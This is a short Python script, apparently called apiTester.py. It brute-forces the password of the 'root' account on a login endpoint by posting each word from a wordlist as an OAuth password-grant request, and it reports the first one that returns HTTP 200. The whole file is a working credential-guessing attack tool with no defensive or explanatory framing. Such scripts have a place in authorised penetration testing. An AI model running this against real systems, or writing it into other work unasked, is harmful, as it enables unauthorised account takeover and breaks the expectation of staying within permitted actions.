import requests
import json
import base64
import sys

#Example usage: 
#./apiTester.py localhost wordlist.txt
host = sys.argv[1]
url = 'http://' + host
wordlist = sys.argv[2]

with open(wordlist) as f:
	for line in f:
		loginBody = { 'grant_type': 'password', 'username': 'root', 'password': line.strip()}
		r = requests.post(url, data=loginBody)
		if r.status_code == 200:
			print 'PASSWORD FOUND:'
			print line.strip()
			break
		else:
			print r
